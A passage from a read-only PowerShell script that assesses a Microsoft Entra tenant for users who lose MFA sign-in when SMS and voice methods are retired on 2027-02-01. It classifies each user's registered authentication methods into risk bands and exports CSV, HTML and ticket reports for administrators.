# generations of names, and which one a tenant's report uses is not something to discover
# on the day. Listing a phone method that never appears costs nothing; missing one hides
# somebody who loses their sign-in.
$phoneMethods = @(
    'mobilePhone', 'alternateMobilePhone', 'officePhone', 'smsSignIn'
    'sms', 'mobileSMS', 'mobileCall', 'alternateMobileCall'
)

# Methods that both survive the retirement and can satisfy MFA on their own.
#
# This list is the difference between "has no passkey" and "cannot sign in". Microsoft's
# blocking prompt on 2027-02-01 applies to users whose ONLY available MFA method is SMS or
# voice. A user with Microsoft Authenticator push is not passwordless-capable and is not
# blocked either, because Authenticator is not being retired.
#
# Deliberately excluded: email and securityQuestion satisfy self-service password reset,
# not MFA. temporaryAccessPass is time-limited by design and is a remediation aid rather
# than a durable method, so counting it would mark somebody safe who is not.
$survivingMfaMethods = @(
    'microsoftAuthenticatorPush'
    'softwareOneTimePasscode'
    'hardwareOneTimePasscode'
    'fido2SecurityKey'
    'windowsHelloForBusiness'
    'passKeyDeviceBound'
    'passKeyDeviceBoundAuthenticator'
    'passKeyDeviceBoundWindowsHello'
    'macOsSecureEnclaveKey'
    'x509Certificate'
    'x509CertificateSingleFactor'
    'x509CertificateMultiFactor'

    # Both turned up on the first run against a real tenant, in the UnrecognisedMethods
    # list, where being unrecognised means being treated as not surviving. Nobody was
    # mis-banded there because every one of those users also held Authenticator push --
    # but a user whose only surviving method was a synced passkey would have been reported
    # as locked out on 2027-02-01 when they are perfectly fine. A false positive on the
    # one number this tool exists to get right.
    'passKeySynced'
    'microsoftAuthenticatorPasswordless'

    # The older spellings of methods already in this list, from the same enum.
    'fido'
    'appNotification'
    'appCode'
)

# Anything Microsoft adds later, or that this list has not caught up with, is treated as
# NOT surviving, so an unrecognised method makes a user look more exposed rather than less.
# Over-warning costs a review; under-warning costs somebody their Monday morning. The
# unrecognised names are surfaced in the summary so the list can be maintained.
$script:UnrecognisedMethods = [System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::OrdinalIgnoreCase)

# Stands in for the dropped InRegistrationReport column. Defined once because the summary
# counts these rows and the CSV displays them, and the two must not drift apart.
$script:NoReportRowMarker = '(no row in registration report)'
$nonMfaMethods = @('email', 'securityQuestion', 'temporaryAccessPass', 'temporaryAccessPassMultiUse', 'appPassword')

# The legacy per-user MFA read, when asked for. A whole-tenant failure here is reported and
# survived rather than thrown: the rest of the assessment is still worth having, and the
# column says '(unreadable)' for everyone so nobody reads the run as having checked.
$perUserMfaStates = @{}
if (-not $SkipLegacyPerUserMfa) {
    $batches = [math]::Ceiling($enabledUsers.Count / 20)
    Write-Host "Reading legacy per-user MFA state for $($enabledUsers.Count) users ($batches batched request(s), beta endpoint)..." -ForegroundColor Cyan
    try {
        $perUserMfaStates = Get-LegacyPerUserMfaState -UserId @($enabledUserIndex.Keys)
    }
    catch {
        Write-Warning "Legacy per-user MFA could not be read, so that exposure is unassessed: $($_.Exception.Message)"
        Write-Warning 'The most common cause is missing Policy.Read.All. Every row will read (unreadable) rather than being assumed clean. Pass -SkipLegacyPerUserMfa to stop attempting it.'
    }
}

$rows = foreach ($user in $enabledUsers) {
    $id = [string](Get-PropertyValue $user 'id')
    $registration = $registrationIndex[$id]
    # Assigned in two statements deliberately. `$x = if (...) { @() }` yields $null, not an
    # empty array, because PowerShell unrolls an empty collection to nothing on the way out
    # of the expression. Every user absent from the registration report went down that
    # branch, so anything downstream that would not take $null crashed the whole run on any
    # tenant with a recently created account.
    $methods = @()
    if ($registration) { $methods = @(Get-PropertyValue $registration 'methodsRegistered') }
    $matchingMethods = @($methods | Where-Object { $_ -in $phoneMethods })

    $inSmsScope = $smsScope.UserIds.Contains($id)
    $inVoiceScope = $voiceScope.UserIds.Contains($id)
    $inPolicyScope = $inSmsScope -or $inVoiceScope
    $hasPhoneMethod = $matchingMethods.Count -gt 0
    $isPasswordlessCapable = if ($registration) { [bool](Get-PropertyValue $registration 'isPasswordlessCapable') } else { $false }
    $isAdmin = if ($registration) { [bool](Get-PropertyValue $registration 'isAdmin') } else { $false }
    $userType = [string](Get-PropertyValue $user 'userType')

    $signInAge = if ($signInActivityAvailable) {
        Get-SignInAge -SignInActivity (Get-PropertyValue $user 'signInActivity') -Now $assessmentStartUtc
    } else { $script:SignInAgeUnavailable }

    # Three states with three meanings, and they must not collapse into each other:
    # not asked for, asked for but unanswered, and a real verdict.
    $perUserMfaState = if ($SkipLegacyPerUserMfa) { $script:PerUserMfaNotChecked }
    elseif ($perUserMfaStates.ContainsKey($id)) { [string]$perUserMfaStates[$id] }
    else { $script:PerUserMfaUnreadable }

    $risk = Get-RiskAssessment -InPolicyScope $inPolicyScope -HasPhoneMethodRegistered $hasPhoneMethod `
        -IsPasswordlessCapable $isPasswordlessCapable -IsAdmin $isAdmin -UserType $userType `
        -PerUserMfaState $perUserMfaState

    $phoneMethodList = ($matchingMethods -join '; ')

    # The precise Microsoft criterion for the 2027-02-01 blocking prompt: a phone method
    # registered and nothing else that both survives the retirement and satisfies MFA.
    # This is a narrower and more actionable population than "not passwordless-capable",
    # which also sweeps up everyone holding Authenticator push.
    foreach ($method in $methods) {
        if ($method -notin $phoneMethods -and $method -notin $survivingMfaMethods -and $method -notin $nonMfaMethods) {
            [void]$script:UnrecognisedMethods.Add([string]$method)
        }
    }
    $onlyPhoneBasedMfa = Test-OnlyPhoneBasedMfa -MethodsRegistered ([string[]]$methods) `
        -PhoneMethods $phoneMethods -SurvivingMfaMethods $survivingMfaMethods

    $upn = [string](Get-PropertyValue $user 'userPrincipalName')

    # Excluded users keep their row so the export stays a complete record of what was
    # assessed -- a filter that silently removes people from a security assessment is how
    # a real account disappears behind a sloppy pattern. They are marked rather than
    # dropped, which also means every downstream filter on the actionable bands excludes
    # them without needing to know the parameter exists.
    $isExcluded = Test-UpnExcluded -UserPrincipalName $upn -Pattern $ExcludeUpnPattern

    $rowRisk = if ($isExcluded) { 'Excluded' } else { $risk[0] }
    $rowReason = if ($isExcluded) {
        'Matched -ExcludeUpnPattern, so not assessed as a migration candidate.'
    } else { $risk[1] }

    $nextStep = if ($isExcluded) {
        'No action. Excluded by pattern at run time. Confirm this is a non-human account before treating the exclusion as correct.'
    } else {
        Get-RemediationStep -Risk $risk[0] -HasPhoneMethodRegistered $hasPhoneMethod `
            -UserType $userType -PhoneMethodsRegistered $phoneMethodList `
            -PerUserMfaState $perUserMfaState
    }

    # A user with no row in the registration report is not the same as a user with nothing
    # registered, and the difference matters: the first is missing data, the second is a
    # finding. Rather than carry a separate InRegistrationReport column for it, the absence
    # is stated in the column somebody actually reads.
    $allMethods = if ($registration) { ($methods -join '; ') } else { $script:NoReportRowMarker }

    # Sixteen columns, chosen so the file is readable in Excel. The registration report
    # also returns isMfaCapable, isMfaRegistered, systemPreferredAuthenticationMethods and
    # a per-row timestamp; none of them changed what anybody did with the file, and the
    # evidence age is still reported once, as OldestReportRowUtc in the summary.
    #
    # PerUserMfaState is always written, even on a run that did not ask for it. A column
    # that appears and disappears between runs breaks Compare-EntraSmsVoiceAssessment and
    # every spreadsheet built on the file; a column that says '(not checked)' does not.
    [PSCustomObject][ordered]@{
        Risk                  = $rowRisk
        Reason                = $rowReason
        NextStep              = $nextStep
        BlockedAtRetirement   = ($onlyPhoneBasedMfa -and -not $isExcluded)
        DisplayName           = [string](Get-PropertyValue $user 'displayName')
        UserPrincipalName     = $upn
        UserType              = $userType
        IsAdmin               = $isAdmin
        InSmsPolicyScope      = $inSmsScope
        InVoicePolicyScope    = $inVoiceScope
        PerUserMfaState       = $perUserMfaState
        DaysSinceLastSignIn   = $signInAge
        PhoneMethodsRegistered = $phoneMethodList
        AllMethodsRegistered  = $allMethods
        IsPasswordlessCapable = $isPasswordlessCapable
        UserId                = $id
    }
}

$rows = @($rows)
# PhoneMethodsRegistered rather than the HasPhoneMethodRegistered column that used to
# exist: trimming the schema left this reading a property the rows no longer carry, which
# under StrictMode throws. It survived review because `-or` short-circuits, so the bad
# access is only reached for a user outside both policy scopes -- which is every Moderate
# and Informational user, and therefore every real tenant.
#
# `Risk -eq 'Excluded'` is in the filter for a different reason: the README and the console
# both promise that an excluded user stays in the file marked Excluded, so the operator can
# audit what the pattern removed. Without this clause an excluded user who is outside both
# scopes and holds no phone method is dropped from the default export entirely, and a
# pattern that quietly matched a real person leaves no trace anywhere.
#
# Legacy per-user MFA is in the filter for a third reason: it is a scope the two boolean
# columns do not represent. A user enforced there with no phone method registered yet is
# High and belongs in the file, but matches none of the other terms.
$affectedRows = @($rows | Where-Object {
    $_.InSmsPolicyScope -or $_.InVoicePolicyScope -or $_.PhoneMethodsRegistered -or
    $_.Risk -eq 'Excluded' -or $_.PerUserMfaState -in @('enabled', 'enforced')
})

# Excluded rows stay in the export as a record of what the pattern removed, and are kept
# out of every number. Counting them as candidates would defeat the point of excluding
# them; dropping them from the file would hide a mistake in the pattern.
$candidateRows = @($affectedRows | Where-Object Risk -ne 'Excluded')
$exportRows = if ($IncludeUnaffected) { $rows } else { $affectedRows }

# Sort so remediation order is the read order: highest risk first, admins ahead of standard users.
$riskOrder = @{ Critical = 0; High = 1; Moderate = 2; Low = 3; Informational = 4; Excluded = 5 }
$exportRows = @($exportRows | Sort-Object `
    @{ Expression = { $riskOrder[$_.Risk] }; Ascending = $true }, `
    @{ Expression = 'IsAdmin'; Descending = $true }, `
    @{ Expression = 'DisplayName'; Ascending = $true })

$outputDirectory = Split-Path -Parent $OutputPath
if ($outputDirectory -and -not (Test-Path -LiteralPath $outputDirectory)) {
    New-Item -ItemType Directory -Path $outputDirectory -Force | Out-Null
}

if ($exportRows.Count -eq 0) {
    Write-Warning 'No migration candidates were found. An empty CSV will be written for evidence retention.'
}
Export-AssessmentCsv -Data $exportRows -Path $OutputPath -SkipAclHardening:$SkipAclHardening

# The registration report lags live directory state; the oldest row age is the honest
# confidence marker for the whole assessment, so it is surfaced in the summary.
#
# Read from the raw Graph payloads rather than the assessment rows: the per-row timestamp
# is no longer written to the CSV, and the rows carry only what the CSV needs.
$reportTimestamps = @($registrations |
    ForEach-Object { Get-PropertyValue $_ 'lastUpdatedDateTime' } |
    Where-Object { $_ })

# Include and exclude targets neither scope resolution could turn into users.
$unresolvedTargets = @($smsScope.UnresolvedTargets) + @($voiceScope.UnresolvedTargets)

$summary = [PSCustomObject][ordered]@{
    TenantId                   = $graphContext.TenantId
    AssessmentTimeUtc          = $assessmentStartUtc.ToString('o')
    DirectoryUsersReturned     = $users.Count
    EnabledUsersAssessed       = $enabledUsers.Count
    UsersSkippedNotEnabled     = $usersSkippedNotEnabled
    RegistrationCampaignState  = $campaignState
    SmsPolicyState             = $smsScope.State
    VoicePolicyState           = $voiceScope.State
    SmsPolicyInclude           = ($smsScope.IncludeNotes -join ' | ')
    SmsPolicyExclude           = ($smsScope.ExcludeNotes -join ' | ')
    VoicePolicyInclude         = ($voiceScope.IncludeNotes -join ' | ')
    VoicePolicyExclude         = ($voiceScope.ExcludeNotes -join ' | ')
    InSmsPolicyScope           = @($rows | Where-Object InSmsPolicyScope).Count
    InVoicePolicyScope         = @($rows | Where-Object InVoicePolicyScope).Count
    # Sits next to the two counts above because it qualifies them. Above zero means those
    # counts are a floor, not a total: the policy targets somebody this run could not
    # resolve to users, so the tenant is at least as exposed as reported, possibly more.
    UnresolvedPolicyTargets    = (@($unresolvedTargets) -join ' | ')
    # The state of the blind spot, stated on every run rather than only when it is closed.
    # A summary that simply omits legacy MFA on a default run reads as a clean tenant.
    LegacyPerUserMfaChecked    = -not [bool]$SkipLegacyPerUserMfa
    LegacyPerUserMfaInForce    = @($rows | Where-Object { $_.PerUserMfaState -in @('enabled', 'enforced') }).Count
    LegacyPerUserMfaUnreadable = @($rows | Where-Object { $_.PerUserMfaState -eq $script:PerUserMfaUnreadable }).Count
    MigrationCandidates        = $candidateRows.Count
    Critical                   = @($candidateRows | Where-Object Risk -eq 'Critical').Count
    High                       = @($candidateRows | Where-Object Risk -eq 'High').Count
    Moderate                   = @($candidateRows | Where-Object Risk -eq 'Moderate').Count
    Low                        = @($candidateRows | Where-Object Risk -eq 'Low').Count
    PasswordlessCapableInScope = @($candidateRows | Where-Object { ($_.InSmsPolicyScope -or $_.InVoicePolicyScope) -and $_.IsPasswordlessCapable }).Count
    # The headline operational number: users who hit the blocking registration prompt on
    # 2027-02-01 because a phone is the only thing they have that satisfies MFA. Narrower
    # than the risk bands, and the one to drive to zero before the date.
    BlockedAtRetirement        = @($candidateRows | Where-Object BlockedAtRetirement).Count
    BlockedAdminsAtRetirement  = @($candidateRows | Where-Object { $_.BlockedAtRetirement -and $_.IsAdmin }).Count
    UnrecognisedMethods        = (@($script:UnrecognisedMethods | Sort-Object) -join '; ')
    UsersExcludedByPattern     = @($rows | Where-Object Risk -eq 'Excluded').Count
    ExcludeUpnPattern          = (@($ExcludeUpnPattern) -join ' | ')
    UsersMissingFromReport     = @($rows | Where-Object { $_.AllMethodsRegistered -eq $script:NoReportRowMarker }).Count
    # How much of the work queue is probably not a person. Counted over the actionable
    # bands only, because that is the list somebody has to work through.
    StaleAccountsInActionList  = @($candidateRows | Where-Object {
            $_.Risk -in @('Critical', 'High', 'Moderate') -and
            (Get-SignInAgeSortKey $_.DaysSinceLastSignIn) -ge $script:StaleSignInDays -and
            (Get-SignInAgeSortKey $_.DaysSinceLastSignIn) -ne [int]::MaxValue
        }).Count
    NeverSignedInInActionList  = @($candidateRows | Where-Object {
            $_.Risk -in @('Critical', 'High', 'Moderate') -and
            $_.DaysSinceLastSignIn -eq $script:SignInAgeNever
        }).Count
    OldestReportRowUtc         = if ($reportTimestamps.Count -gt 0) { ($reportTimestamps | Sort-Object | Select-Object -First 1) } else { $null }
    OutputPath                 = (Resolve-Path -LiteralPath $OutputPath).Path
}

# The summary is printed once, at the very end, by being returned -- see the foot of this
# script. It used to be written to the host here *and* returned, which rendered the whole
# block twice on an interactive run: thirty lines of summary, the findings, then the same
# thirty lines again. Returning it alone gets both cases right, because PowerShell renders
# an uncaptured object and stays quiet about a captured one.

# The action list is written on every run: it is the spreadsheet a technician works from,
# and it costs nothing, being derived from data already in memory. No extra Graph calls.
#
# Emitting the list is read-only. Creating and populating the migration security group
# stays a deliberate manual step, because that is a write and this tool does not write.
$actionListPath = [System.IO.Path]::ChangeExtension($OutputPath, $null).TrimEnd('.') + '_ActionList.csv'
$actionListRows = New-ActionList -Rows $rows

Export-AssessmentCsv -Data $actionListRows -Path $actionListPath -SkipAclHardening:$SkipAclHardening
$summary | Add-Member -NotePropertyName ActionListPath -NotePropertyValue (Resolve-Path -LiteralPath $actionListPath).Path
Write-Host "Action list ($($actionListRows.Count) users, attach this to a ticket): $actionListPath" -ForegroundColor Green

if ($ExportFixScript) {
    $fixPath = [System.IO.Path]::ChangeExtension($OutputPath, $null).TrimEnd('.') + '_Remediation.ps1'
    # Full rows, not the action list: the action list is deliberately narrow and does not
    # carry PerUserMfaState. The function filters to the actionable bands itself.
    $written = New-RemediationScript -Rows $rows -Path $fixPath -Customer $CustomerName `
        -GeneratedFrom (Resolve-Path -LiteralPath $OutputPath).Path `
        -SkipAclHardening:$SkipAclHardening
    $summary | Add-Member -NotePropertyName FixScriptPath -NotePropertyValue $written
    Write-Host "Remediation commands (review before running; nothing has been run): $written" -ForegroundColor Green
}

if ($HtmlReport) {
    $htmlPath = [System.IO.Path]::ChangeExtension($OutputPath, 'html')
    $written = New-HtmlReport -Summary $summary -Rows $exportRows -Path $htmlPath -Customer $CustomerName -SkipAclHardening:$SkipAclHardening
    $summary | Add-Member -NotePropertyName HtmlReportPath -NotePropertyValue (Resolve-Path -LiteralPath $written).Path
    Write-Host "Client report: $written" -ForegroundColor Green
}

if ($ExportTickets) {
    $ticketPath = [System.IO.Path]::ChangeExtension($OutputPath, $null).TrimEnd('.') + '_Tickets.csv'

    # Default the history beside the ticket CSV. With dated output folders that will not be
    # found, which is why -TicketHistoryPath exists and why the console says which file was used.
    $historyPath = if ($TicketHistoryPath) { $TicketHistoryPath }
                   else { [System.IO.Path]::ChangeExtension($OutputPath, $null).TrimEnd('.') + '_TicketHistory.json' }

    $history = if ($IgnoreTicketHistory) { @{} } else { Get-TicketHistory -Path $historyPath }

    $ticketResult = New-TicketExport -Rows $rows -Path $ticketPath -Customer $CustomerName `
        -MaxIndividual $MaxIndividualTickets -History $history `
        -SkipAclHardening:$SkipAclHardening

    Save-TicketHistory -Path $historyPath -History $ticketResult.History -SkipAclHardening:$SkipAclHardening

    $summary | Add-Member -NotePropertyName TicketExportPath -NotePropertyValue (Resolve-Path -LiteralPath $ticketResult.Path).Path
    $summary | Add-Member -NotePropertyName TicketsGenerated -NotePropertyValue $ticketResult.Count
    $summary | Add-Member -NotePropertyName TicketsSuppressedAsAlreadyRaised -NotePropertyValue $ticketResult.Suppressed
    $summary | Add-Member -NotePropertyName TicketHistoryPath -NotePropertyValue (Resolve-Path -LiteralPath $historyPath).Path

    Write-Host "Ticket queue ($($ticketResult.Count) tickets): $($ticketResult.Path)" -ForegroundColor Green
    if ($ticketResult.Suppressed -gt 0) {
        Write-Host "  $($ticketResult.Suppressed) user(s) already ticketed by an earlier run and not raised again. History: $historyPath" -ForegroundColor Cyan
    }
    if ($IgnoreTicketHistory) {
        Write-Host '  -IgnoreTicketHistory was set, so every actionable user was ticketed regardless of previous runs.' -ForegroundColor Yellow
    }
}

# The headline, stated as people rather than rows. A run against a real tenant produced
# twenty-four rows, a nine-user action list, and two people who actually lose their
# sign-in -- and nothing on screen said which number was which.
Write-Host ''
if ($summary.BlockedAtRetirement -gt 0) {
    $adminNote = if ($summary.BlockedAdminsAtRetirement -gt 0) { " $($summary.BlockedAdminsAtRetirement) of them privileged." } else { '' }
    Write-Host "$($summary.BlockedAtRetirement) user(s) lose their sign-in on 2027-02-01. A phone is their only method that satisfies MFA.$adminNote" -ForegroundColor Red
    Write-Host 'This is the number to drive to zero. Everything else is posture.' -ForegroundColor Red
}
else {
    Write-Host 'Nobody loses their sign-in on 2027-02-01: no user holds a phone as their only method that satisfies MFA.' -ForegroundColor Green
}

# Immediately after, because it changes how long the queue really is.
if ($summary.StaleAccountsInActionList -gt 0 -or $summary.NeverSignedInInActionList -gt 0) {
    $parts = @()
    if ($summary.StaleAccountsInActionList -gt 0) { $parts += "$($summary.StaleAccountsInActionList) not signed in for $($script:StaleSignInDays)+ days" }
    if ($summary.NeverSignedInInActionList -gt 0) { $parts += "$($summary.NeverSignedInInActionList) never signed in" }
    Write-Host "Of the action list, $($parts -join ' and '). Check those against your leaver process before chasing anybody." -ForegroundColor Yellow
}
if ($summary.UsersExcludedByPattern -gt 0) {
    Write-Host "$($summary.UsersExcludedByPattern) user(s) excluded by -ExcludeUpnPattern and left out of every count. They remain in the CSV marked Excluded; check the pattern did not catch a real person." -ForegroundColor Cyan
}
if ($summary.UnrecognisedMethods) {
    Write-Host "Unrecognised authentication methods seen: $($summary.UnrecognisedMethods). Treated as NOT surviving the retirement, so affected users are reported as more exposed rather than less." -ForegroundColor Yellow
}

# The one warning that invalidates the headline numbers rather than qualifying them.
if ($unresolvedTargets.Count -gt 0) {
    Write-Host "`nSCOPE INCOMPLETE. $($unresolvedTargets.Count) policy target(s) could not be resolved to users:" -ForegroundColor Red
    foreach ($target in $unresolvedTargets) { Write-Host "  $target" -ForegroundColor Red }
    Write-Host 'The in-scope counts above are a FLOOR, not a total. Users covered by these targets are missing from this assessment. Resolve them by hand before reporting this tenant as assessed.' -ForegroundColor Red
}

# Legacy per-user MFA is the one exposure this tool can miss entirely, so its state is
# reported on every run: checked and clean, checked and found, or not checked at all.
if ($SkipLegacyPerUserMfa) {
    Write-Host "`nLegacy per-user MFA was NOT checked, because -SkipLegacyPerUserMfa was set. This run cannot rule it out: users enabled for SMS or voice there are in scope for the retirement and will not appear above as in scope." -ForegroundColor Yellow
    Write-Host 'Drop that switch to close the gap. It needs no extra permission beyond the Policy.Read.All this run already used.' -ForegroundColor Yellow
}
elseif ($summary.LegacyPerUserMfaInForce -gt 0) {
    Write-Host "`n$($summary.LegacyPerUserMfaInForce) user(s) are enabled or enforced in legacy per-user MFA. They are in scope for the retirement whatever the modern policy says, and the registration campaign will not reach them until they are converted to it." -ForegroundColor Red
}
else {
    Write-Host "`nNo user is enabled or enforced in legacy per-user MFA. That exposure is ruled out for this tenant." -ForegroundColor Green
}
if ($summary.LegacyPerUserMfaUnreadable -gt 0) {
    Write-Host "$($summary.LegacyPerUserMfaUnreadable) user(s) returned no readable per-user MFA state. They are marked (unreadable), not clean; re-run before treating this tenant as assessed." -ForegroundColor Yellow
}

Write-Host "`n2026-09-01  Passkey auto-enablement and registration nudge begins." -ForegroundColor Yellow
Write-Host '2027-02-01  SMS and voice retired. No opt-out.' -ForegroundColor Red
Write-Host 'Passkey deployment guide: https://aka.ms/passkey-deployment-guide' -ForegroundColor Cyan
Write-Host 'Read-only run. No tenant settings were changed.' -ForegroundColor Green

# Last, so the header sits directly above the summary it introduces. Every Write-Host
# above has already reached the host by the time the returned object renders.
Write-Host "`n===== ENTRA SMS/VOICE MIGRATION IMPACT =====" -ForegroundColor Magenta

if ($PassThru) { $exportRows }
$summary
